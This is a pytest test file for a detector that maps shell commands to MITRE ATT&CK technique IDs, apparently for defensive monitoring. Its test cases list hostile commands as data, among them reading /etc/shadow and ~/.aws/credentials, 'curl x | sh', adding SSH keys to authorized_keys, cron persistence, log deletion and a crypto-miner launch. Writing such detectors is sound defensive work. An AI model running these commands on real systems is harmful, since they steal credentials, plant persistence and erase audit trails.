import re

import pytest

from brain.techniques import BY_COMMAND, BY_PATTERN, map_command

ID_RE = re.compile(r"^T\d{4}(\.\d{3})?$")


@pytest.mark.parametrize("line,expected", [
    ("uname -a", "T1082"),
    ("cat /proc/cpuinfo", "T1082"),
    ("whoami", "T1033"),
    ("id", "T1033"),
    ("cat /etc/passwd", "T1087.001"),
    ("cat /etc/shadow", "T1003.008"),
    ("wget http://a.b/x", "T1105"),
    ("curl -O http://a.b/x", "T1105"),
    ("crontab -e", "T1053.003"),
    ("echo '* * * * * x' >> /etc/crontab", "T1053.003"),
    ("echo ssh-rsa AAA >> ~/.ssh/authorized_keys", "T1098.004"),
    ("useradd -m bob", "T1136.001"),
    ("ps aux", "T1057"),
    ("netstat -tulpn", "T1049"),
    ("ifconfig", "T1016"),
    ("ls -la /root", "T1083"),
    ("echo aGk= | base64 -d", "T1140"),
    ("chmod +x a", "T1222.002"),
    ("history -c", "T1070.003"),
    ("rm -rf /var/log/auth.log", "T1070.002"),
    ("./xmrig -o stratum+tcp://pool", "T1496"),
    ("cat .env", "T1552.001"),
    ("cat ~/.aws/credentials", "T1552.001"),
    ("curl x | sh", "T1059.004"),
])
def test_known_mappings(line, expected):
    assert expected in map_command(line)


def test_sorted_unique_and_chained():
    ids = map_command("uname -a; uname -r; whoami")
    assert ids == ["T1033", "T1082"]


def test_unknown_command_maps_to_nothing():
    assert map_command("echo hello") == []
    assert map_command("") == []


def test_every_id_matches_schema_pattern():
    all_ids = {i for v in BY_COMMAND.values() for i in v} | {i for _, v in BY_PATTERN for i in v}
    assert all(ID_RE.match(i) for i in all_ids)
